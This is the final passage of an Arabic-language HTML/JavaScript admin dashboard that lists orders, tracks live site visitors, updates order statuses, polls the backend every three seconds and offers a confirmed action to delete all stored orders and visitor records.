    '<div class="del-confirm-row">'+
    '<button style="background:#dc2626;color:#fff" onclick="doResetAll()">✅ نعم، احذف الكل</button>'+
    '<button style="background:#f3f4f6;color:#1a1a2e;border:1px solid #d1d5db" onclick="cancelDel()">❌ إلغاء</button></div>';
}
async function doResetAll(){
  showNotif('⏳ جاري الحذف...');
  // Delete all orders (visitors table)
  for(var i=0;i<orders.length;i++){await sbDel('visitors',orders[i].id)}
  // Delete all site_visitors
  var sv=await sbGet('site_visitors','select=id');
  for(var j=0;j<sv.length;j++){await sbDel('site_visitors',sv[j].id)}
  orders=[];visitors=[];prevIds=new Set();selId=null;
  renderStats();renderActive();renderOrders();closeDetail();
  await loadOrders();await loadVisitors();
  showNotif('✅ تم تصفير جميع البيانات بنجاح');
}
function cancelDel(){var o=orders.find(function(x){return String(x.id)===String(selId)});if(o)renderDetail(o)}

function doAction(id,status){
  sbPatch('visitors',id,{status:status,last_activity_at:new Date().toISOString()}).then(function(){
    showNotif('✅ تم تحديث الحالة');loadOrders()});
}

async function loadOrders(){
  var d=await sbGet('visitors','select=*&order=created_at.desc');
  var nw=d||[];
  var nids=new Set(nw.map(function(o){return o.id}));
  if(prevIds.size>0){var fresh=nw.filter(function(o){return!prevIds.has(o.id)});
    if(fresh.length){playSound();showNotif('🔔 طلب جديد: '+(fresh[0].name||'مجهول'))}}
  prevIds=nids;orders=nw;renderStats();renderActive();renderOrders();
  if(selId){var o=orders.find(function(x){return String(x.id)===String(selId)});if(o)renderDetail(o);else closeDetail()}
}
async function loadVisitors(){
  var cutoff=new Date(Date.now()-60000).toISOString();
  var d=await sbGet('site_visitors','select=*&created_at=gte.'+encodeURIComponent(cutoff)+'&order=created_at.desc');
  visitors=d||[];renderStats();
}

function openVM(){
  var h='<div class="modal"><div class="modal-head"><div><h3 style="margin:0">📊 الزوار النشطين</h3></div>'+
    '<div class="btns"><button style="background:#f3f4f6;border:1px solid #d1d5db;color:#1a1a2e" onclick="loadVisitors();openVM()">🔄 تحديث</button>'+
    '<button style="background:#fee2e2;border:1px solid #fca5a5;color:#dc2626" onclick="closeVM()">✕ إغلاق</button></div></div>';
  h+='<div class="modal-body">';
  h+='<div class="vm-stats">'+
    '<div class="vm-sc" style="background:#f5eedf;border:1px solid #C5A572">'+
    '<div class="n" style="color:#C5A572">'+orders.length+'</div><div class="l">إجمالي الطلبات</div></div>'+
    '<div class="vm-sc" style="background:#d1fae5;border:1px solid #6ee7b7">'+
    '<div class="n" style="color:#22c55e;display:flex;align-items:center;justify-content:center;gap:6px">'+
    '<span style="width:8px;height:8px;border-radius:50%;background:#22c55e;display:inline-block"></span>'+visitors.length+'</div>'+
    '<div class="l">نشط الآن</div></div>'+
    '<div class="vm-sc" style="background:#fef3c7;border:1px solid #fcd34d">'+
    '<div class="n" style="color:#f59e0b">'+orders.filter(isPending).length+'</div><div class="l">بانتظار إجراء</div></div></div>';

  if(!visitors.length){
    h+='<div style="text-align:center;padding:40px 20px;color:#9ca3af"><div style="font-size:36px;margin-bottom:8px">🌐</div>'+
      '<p style="font-size:13px;margin:0">لا يوجد زوار نشطين الآن</p></div>';
  }else{
    h+='<div style="border:1px solid #e5e7eb;border-radius:12px;overflow:hidden"><table class="vm-table"><thead><tr>'+
      '<th>#</th><th>معرف الزائر</th><th>الحالة</th><th>الوقت</th></tr></thead><tbody>';
    visitors.forEach(function(v,i){
      var vid=v.visitor_id||v.id||'';
      h+='<tr><td style="color:#9ca3af">'+(i+1)+'</td>'+
        '<td style="font-family:monospace;color:#cbd5e1">'+esc(String(vid).slice(0,20))+'</td>'+
        '<td><span class="online"><span class="d"></span>متصل</span></td>'+
        '<td style="color:#6b7280">'+fmtDate(v.created_at)+'</td></tr>';
    });
    h+='</tbody></table></div>';
  }

  h+='<div class="vm-footer"><span class="note">يتم تحديث قائمة الزوار تلقائياً كل 3 ثوانٍ</span>'+
    '<button style="background:#fee2e2;border:1px solid #fca5a5;color:#dc2626;border-radius:8px;padding:6px 14px;font-size:11px;font-weight:700;cursor:pointer;font-family:Cairo,sans-serif" onclick="resetVisitors()">⚠️ تصفير جميع البيانات</button></div>';

  h+='</div></div>';
  document.getElementById('vModal').innerHTML=h;
  document.getElementById('vModal').classList.add('show');
}
function closeVM(){document.getElementById('vModal').classList.remove('show');document.getElementById('vModal').innerHTML=''}

async function resetVisitors(){
  if(!confirm('⚠️ هل أنت متأكد؟ سيتم حذف جميع الطلبات والزوار نهائياً!'))return;
  await doResetAll();closeVM();
}

checkAuth();
setInterval(function(){if(sessionStorage.getItem('er_admin')==='1'){loadOrders();loadVisitors()}},3000);
</script>
</body>
</html>
